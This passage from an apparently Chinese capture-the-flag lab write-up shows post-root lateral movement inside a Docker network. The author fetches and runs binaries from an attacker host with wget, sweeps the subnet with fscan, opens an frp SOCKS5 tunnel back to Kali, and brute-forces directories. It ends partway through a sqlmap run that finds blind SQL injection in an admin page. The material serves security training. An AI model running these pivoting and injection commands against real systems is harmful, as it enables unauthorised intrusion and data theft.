-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">273</span> Feb <span class="token number">15</span>  <span class="token number">2023</span> .wget-hsts
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">272</span> Feb <span class="token number">16</span>  <span class="token number">2023</span> flag.txt
root@d45eb9e78ad8:~<span class="token comment"># cat flag.txt</span>
<span class="token function">cat</span> flag.txt

█▀█ █▀█ █▀█ ▀█▀   █▀█ █▀█   █▄ █ █▀█ ▀█▀   
█▀▄ █▄█ █▄█  █    █▄█ █▀▄   █ ▀█ █▄█  █   

Flag <span class="token number">4</span>: HELL<span class="token punctuation">&#123;</span>CR3D3NT14LS_1N_HTP455WD_3H?<span class="token punctuation">&#125;</span></code></pre>
<p>拿到flag4,root都没什么东西大概要横向了<br>传个ifconifg下网段</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># wget http://192.168.56.104:6677/ifconfig                                                                                                </span>
<span class="token function">wget</span> http://192.168.56.104:6677/ifconfig                                                                                                                     
--2024-07-17 01:52:41--  http://192.168.56.104:6677/ifconfig
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">83976</span> <span class="token punctuation">(</span>82K<span class="token punctuation">)</span> <span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span>
Saving to: ‘ifconfig’

<span class="token function">ifconfig</span>            <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>  <span class="token number">82</span>.01K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-07-17 01:52:41 <span class="token punctuation">(</span><span class="token number">187</span> MB/s<span class="token punctuation">)</span> - ‘ifconfig’ saved <span class="token punctuation">[</span><span class="token number">83976</span>/83976<span class="token punctuation">]</span>

root@d45eb9e78ad8:~<span class="token comment"># chmod +x ifconfig</span>
<span class="token function">chmod</span> +x <span class="token function">ifconfig</span>
root@d45eb9e78ad8:~<span class="token comment"># ./ifconfig</span>
./ifconfig
eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        inet <span class="token number">172.17</span>.0.2  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.17</span>.255.255
        ether 02:42:ac:11:00:02  txqueuelen <span class="token number">0</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">103384</span>  bytes <span class="token number">53031457</span> <span class="token punctuation">(</span><span class="token number">50.5</span> MiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">102450</span>  bytes <span class="token number">77570246</span> <span class="token punctuation">(</span><span class="token number">73.9</span> MiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>
        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
        RX packets <span class="token number">203</span>  bytes <span class="token number">15992</span> <span class="token punctuation">(</span><span class="token number">15.6</span> KiB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">203</span>  bytes <span class="token number">15992</span> <span class="token punctuation">(</span><span class="token number">15.6</span> KiB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>
<p>网段是172.17.0.0&#x2F;16,传个fscan看一下存活主机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@d45eb9e78ad8:~<span class="token comment"># ./fscan -h 172.17.0.0/16</span>

   ___                              _    
  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
 / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
/ /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    
<span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>   
                     fscan version: <span class="token number">1.8</span>.4
start infoscan
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.1      is alive
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.2      is alive
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">172.17</span>.0.3      is alive
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> LiveTop <span class="token number">172.17</span>.0.0/16    段存活数量为: <span class="token number">3</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> LiveTop <span class="token number">172.17</span>.0.0/24    段存活数量为: <span class="token number">3</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">3</span>
<span class="token number">172.17</span>.0.1:21 <span class="token function">open</span>
<span class="token number">172.17</span>.0.3:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.2:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.1:80 <span class="token function">open</span>
<span class="token number">172.17</span>.0.3:22 <span class="token function">open</span>
<span class="token number">172.17</span>.0.1:22 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">6</span>
start vulscan
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token function">ftp</span> <span class="token number">172.17</span>.0.1:21:anonymous 
   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>flag.txt                                                                                                                                                                                                    
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.2         code:401 len:457    title:401 Unauthorized                                                                                                                                  
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.1         code:401 len:457    title:401 Unauthorized
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://172.17.0.3         code:200 len:761    title:<span class="token string">""</span></code></pre>
<p>还有3个存活主机，1应该是网关，那么目标因该是3.做个socks代理吧，方便操作</p>
<h2 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h2><p>用下frp吧</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">//kali
<span class="token operator">></span> <span class="token function">cat</span> frps.ini             
<span class="token punctuation">[</span>common<span class="token punctuation">]</span> 
bind_port <span class="token operator">=</span> <span class="token number">7000</span>
 ~/Desktop/frp                                                                                                                                                                                                                         root@kali2  09:32:01 
<span class="token operator">></span> ./frps <span class="token parameter variable">-c</span> frps.ini
WARNING: ini <span class="token function">format</span> is deprecated and the support will be removed <span class="token keyword">in</span> the future, please use yaml/json/toml <span class="token function">format</span> instead<span class="token operator">!</span>
<span class="token number">2024</span>-07-17 09:32:35.078 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>frps/root.go:105<span class="token punctuation">]</span> frps uses config file: frps.ini
<span class="token number">2024</span>-07-17 09:32:35.201 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>server/service.go:237<span class="token punctuation">]</span> frps tcp listen on <span class="token number">0.0</span>.0.0:7000                                                                                                                                                                          
<span class="token number">2024</span>-07-17 09:32:35.202 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>frps/root.go:114<span class="token punctuation">]</span> frps started successfully      </code></pre>


<pre class="language-bash" data-language="bash"><code class="language-bash">//machine
root@d45eb9e78ad8:~<span class="token comment"># cat frpc.ini</span>
<span class="token punctuation">[</span>common<span class="token punctuation">]</span>
server_addr <span class="token operator">=</span> <span class="token number">192.168</span>.56.104
server_port <span class="token operator">=</span> <span class="token number">7000</span>

<span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>
<span class="token builtin class-name">type</span> <span class="token operator">=</span> tcp
plugin <span class="token operator">=</span> socks5
remote_port <span class="token operator">=</span> <span class="token number">10088</span>
root@d45eb9e78ad8:~<span class="token comment"># ./frpc -c frpc.ini</span>
WARNING: ini <span class="token function">format</span> is deprecated and the support will be removed <span class="token keyword">in</span> the future, please use yaml/json/toml <span class="token function">format</span> instead<span class="token operator">!</span>
<span class="token number">2024</span>-07-17 03:33:14.046 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>sub/root.go:142<span class="token punctuation">]</span> start frpc <span class="token function">service</span> <span class="token keyword">for</span> config <span class="token function">file</span> <span class="token punctuation">[</span>frpc.ini<span class="token punctuation">]</span>
<span class="token number">2024</span>-07-17 03:33:14.046 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/service.go:294<span class="token punctuation">]</span> try to connect to server<span class="token punctuation">..</span>.                                                                                                                                    
<span class="token number">2024</span>-07-17 03:33:14.049 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/service.go:286<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> login to server success, get run <span class="token function">id</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span>                                                                                      
<span class="token number">2024</span>-07-17 03:33:14.049 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>proxy/proxy_manager.go:173<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> proxy added: <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span>                                                                                                                  
<span class="token number">2024</span>-07-17 03:33:14.050 <span class="token punctuation">[</span>I<span class="token punctuation">]</span> <span class="token punctuation">[</span>client/control.go:168<span class="token punctuation">]</span> <span class="token punctuation">[</span>6a242b9d96fb0ae6<span class="token punctuation">]</span> <span class="token punctuation">[</span>socks5<span class="token punctuation">]</span> start proxy success   </code></pre>

<pre class="language-none"><code class="language-none">去kali配置一下代理
&#96;&#96;&#96;bash
&gt; cat &#x2F;etc&#x2F;proxychains.conf 
[ProxyList]
socks5 127.0.0.1 10088</code></pre>
<p>扫一下172.17.0.3的端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> proxychains nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-T4</span> <span class="token number">172.17</span>.0.3
Nmap scan report <span class="token keyword">for</span> <span class="token number">172.17</span>.0.3
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0029s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.78</span> seconds</code></pre>
<p>开放了22 80两个端口</p>
<h2 id="web探测2"><a href="#web探测2" class="headerlink" title="web探测2"></a>web探测2</h2><p>浏览器也得挂下代理<br><img src="https://ooo.0x0.ooo/2024/07/17/ORkLBg.png" alt="ORkLBg.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/07/17/ORkEZB.png" alt="ORkEZB.png" loading="lazy"><br>没什么功能点，扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://172.17.0.3/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">--proxy</span> socks5://127.0.0.1:1080

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://172.17.0.3/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Proxy:                   socks5://127.0.0.1:1080
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">275</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">275</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">761</span><span class="token punctuation">]</span>
Progress: <span class="token number">1033</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">0.08</span>%<span class="token punctuation">)</span><span class="token punctuation">[</span>ERROR<span class="token punctuation">]</span> Get <span class="token string">"http://172.17.0.3/careers"</span><span class="token builtin class-name">:</span> context deadline exceeded <span class="token punctuation">(</span>Client.Timeout exceeded <span class="token keyword">while</span> awaiting headers<span class="token punctuation">)</span>
/admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">308</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://172.17.0.3/admin/<span class="token punctuation">]</span></code></pre>
<p><img src="https://ooo.0x0.ooo/2024/07/17/ORkSMK.png" alt="ORkSMK.png" loading="lazy"></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://172.17.0.3/admin/index.php?id=1"</span> <span class="token parameter variable">--proxy</span><span class="token operator">=</span><span class="token string">"socks5://127.0.0.1:10088"</span> <span class="token parameter variable">--batch</span>

        ___
       __H__                                                                                                                                                                                                                                                                                                               
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">&#123;</span><span class="token number">1.8</span>.2<span class="token comment">#stable&#125;                                                                                                                                                                                                                                                                                   </span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token string">']     | .'</span><span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span>                                                                                                                                                                                                                                                                                                  
<span class="token operator">|</span>___<span class="token operator">|</span>_  <span class="token punctuation">[</span>.<span class="token punctuation">]</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>__,<span class="token operator">|</span>  _<span class="token operator">|</span>                                                                                                                                                                                                                                                                                                  
      <span class="token operator">|</span>_<span class="token operator">|</span>V<span class="token punctuation">..</span>.       <span class="token operator">|</span>_<span class="token operator">|</span>   https://sqlmap.org                                                                                                                                                                                                                                                                               

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> legal disclaimer: Usage of sqlmap <span class="token keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="token string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:35:12 /2024-07-17/

[09:35:12] [INFO] testing connection to the target URL
[09:35:12] [INFO] testing if the target URL content is stable
[09:35:13] [INFO] target URL content is stable
[09:35:13] [INFO] testing if GET parameter '</span><span class="token function">id</span><span class="token string">' is dynamic
[09:35:13] [WARNING] GET parameter '</span><span class="token function">id</span><span class="token string">' does not appear to be dynamic
[09:35:13] [WARNING] heuristic (basic) test shows that GET parameter '</span><span class="token function">id</span><span class="token string">' might not be injectable
[09:35:13] [INFO] testing for SQL injection on GET parameter '</span><span class="token function">id</span><span class="token string">'
[09:35:13] [INFO] testing '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">'
[09:35:13] [INFO] GET parameter '</span><span class="token function">id</span><span class="token string">' appears to be '</span>AND boolean-based blind - WHERE or HAVING clause<span class="token string">' injectable (with --string="Query was successfully")
[09:35:13] [INFO] heuristic (extended) test shows that the back-end DBMS could be '</span>MySQL<span class="token string">' 
it looks like the back-end DBMS is '</span>MySQL<span class="token string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for '</span>MySQL<span class="token string">' extending provided level (1) and risk (1) values? [Y/n] Y
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">4.1</span> AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">4.1</span> OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL OR error-based - WHERE or HAVING clause <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - PROCEDURE ANALYSE <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>BIGINT UNSIGNED<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.5</span> error-based - Parameter replace <span class="token punctuation">(</span>EXP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.6</span> error-based - Parameter replace <span class="token punctuation">(</span>GTID_SUBSET<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.7</span>.8 error-based - Parameter replace <span class="token punctuation">(</span>JSON_KEYS<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span> error-based - Parameter replace <span class="token punctuation">(</span>FLOOR<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>UPDATEXML<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.1</span> error-based - Parameter replace <span class="token punctuation">(</span>EXTRACTVALUE<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>Generic inline queries<span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL inline queries<span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries<span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP - comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK - comment<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">&lt;</span> <span class="token number">5.0</span>.12 stacked queries <span class="token punctuation">(</span>BENCHMARK<span class="token punctuation">)</span><span class="token string">'
[09:35:13] [INFO] testing '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">'
[09:35:23] [INFO] GET parameter '</span><span class="token function">id</span><span class="token string">' appears to be '</span>MySQL <span class="token operator">>=</span> <span class="token number">5.0</span>.12 AND time-based blind <span class="token punctuation">(</span>query SLEEP<span class="token punctuation">)</span><span class="token string">' injectable 
[09:35:23] [INFO] testing '</span>Generic UNION query <span class="token punctuation">(</span>NULL<span class="token punctuation">)</span> - <span class="token number">1</span> to <span class="token number">20</span> columns<span class="token string">'
[09:35:23] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[09:35:23] [INFO] '</span>ORDER BY<span class="token string">' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[09:35:23] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '</span>--union-char<span class="token string">'? [Y/n] Y
